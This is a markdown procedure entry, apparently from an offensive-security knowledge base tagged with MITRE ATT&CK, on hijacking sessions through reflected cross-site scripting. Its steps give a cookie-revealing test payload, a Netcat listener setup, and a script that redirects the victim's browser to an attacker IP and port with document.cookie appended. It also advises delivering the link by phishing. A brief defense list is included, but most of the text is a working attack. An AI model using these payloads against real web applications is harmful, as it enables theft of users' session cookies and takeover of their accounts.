---
id: 022eef4d-a6f3-4798-a58f-7106e4268374
type: procedure
verified: true
submitted: true
created_at: '2020-07-23T14:34:05.969384Z'
updated_at: '2023-05-26T18:26:23.344129Z'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Steal Web Session Cookie]]'
sub_techniques: []
tags:
  - owasp
  - owasp top 10
  - web-applications
  - xss
  - session-hijacking
commands:
  - '[[commands/nc-listen-for-cookie-exfil]]'
tools:
  - '[[tools/Netcat]]'
platforms:
  - Web
validated: true
---

# Session-Hijacking-Through-Reflected-XSS

## Summary

This procedure exploits a reflected cross-site scripting (XSS) vulnerability in a web application to hijack a user's session by stealing their session cookies and exfiltrating them to an attacker-controlled server. By injecting malicious JavaScript into a vulnerable input field, such as a search box, the attacker can access the document.cookie object and transmit it via a redirect to a listener, allowing session replay and unauthorized access to the victim's account.

## Description

Reflected XSS occurs when user-supplied input is immediately rendered in the browser without proper sanitization or encoding, enabling arbitrary JavaScript execution in the context of the victim's session. In this technique, the attacker first verifies the vulnerability by injecting a payload that alerts the session cookie. Once confirmed, a listener is established on the attacker's machine using a tool like Netcat. The exfiltration payload then redirects the victim's browser to the attacker's server, appending the cookie as a query parameter. This stolen cookie can be used to impersonate the victim. The attack targets web applications with unauthenticated or low-privilege input fields and assumes the attacker can deliver the payload via social engineering (e.g., phishing link) or direct interaction. It maps to MITRE ATT&CK tactics for Initial Access (phishing or drive-by) and Collection (credential theft), commonly seen in OWASP Top 10 A7: Cross-Site Scripting scenarios.

## Requirements

- A web application with a reflected XSS vulnerability in an input field (e.g., search or parameter reflection without escaping).
- Attacker machine with network accessibility from the victim's browser (e.g., public IP or tunneled endpoint).
- Netcat or equivalent tool installed on the attacker machine for listening.
- Ability to interact with or trick the victim into submitting the malicious input (e.g., via crafted URL).
- Basic knowledge of JavaScript and HTTP requests; no elevated privileges required on the target.

## Defense

- Implement strict input validation, output encoding (e.g., HTML entity encoding), and context-aware escaping to prevent script injection.
- Enforce Content Security Policy (CSP) headers to block inline scripts and restrict data exfiltration endpoints.
- Set HttpOnly and Secure flags on session cookies to prevent JavaScript access and ensure HTTPS transmission.
- Deploy Web Application Firewalls (WAFs) with XSS detection rules to block common payloads.
- Monitor for anomalous redirects, unexpected network connections from browsers, and JavaScript errors in application logs.

## Objectives

1. Confirm the presence of a reflected XSS vulnerability by executing a test payload that reveals session cookies.
2. Establish a receiver to capture exfiltrated session data from the victim's browser.
3. Steal and transmit the victim's session cookie to enable hijacking and unauthorized access.

## Instructions

### Step 1: Verify Reflected XSS Vulnerability

**Context**: Test the input field to ensure it reflects unsanitized user input, allowing JavaScript execution and cookie access. This step confirms the vulnerability before attempting exfiltration.

Inject the [[codes/JavaScript-Alert-Cookie-XSS-Payload]] into the vulnerable input field (e.g., search box) and submit the form or request.

```html
<script>alert(document.cookie)</script>
```

> This payload executes in the browser context, displaying an alert with the session cookie (e.g., SESSION_ID=abc123). If no alert appears, the input may be sanitized—try variations like encoding or bypassing filters.

### Step 2: Set Up Listener on Attacker Machine

**Context**: Create a TCP listener to receive the incoming connection and cookie data from the victim's browser. Choose a port accessible over the network (e.g., 333) and ensure firewall rules allow inbound traffic.

Execute the [[commands/nc-listen-for-cookie-exfil]] on your attacker machine, replacing the port if needed.

> The command starts Netcat in listen mode, waiting for the victim's browser to connect. Success is indicated by the listener prompt showing it's bound to the port.

### Step 3: Inject Exfiltration Payload

**Context**: Deliver the payload that forces the browser to redirect to your listener, appending the session cookie in the URL query string for capture. This step assumes the vulnerability is confirmed and the listener is active.

Use the [[codes/JavaScript-Exfil-Cookie-to-Attacker-XSS-Payload]], substituting your attacker's IP and port, then inject it into the same vulnerable input field and submit.

```html
<script type="text/javascript">document.location='http://192.168.1.14:333?cookie='+document.cookie;</script>
```

> Upon execution, the browser redirects to http://attacker-ip:port?cookie=SESSION_ID=abc123, sending the GET request to your listener. In real scenarios, deliver this via a phishing email or malicious link to target a specific victim without direct interaction.

**Expected Output**: The Netcat listener receives a connection with the full HTTP request, including the cookie in the query string (e.g., GET /?cookie=SESSION_ID=abc123; path=/ HTTP/1.1 Host: 192.168.1.14:333).
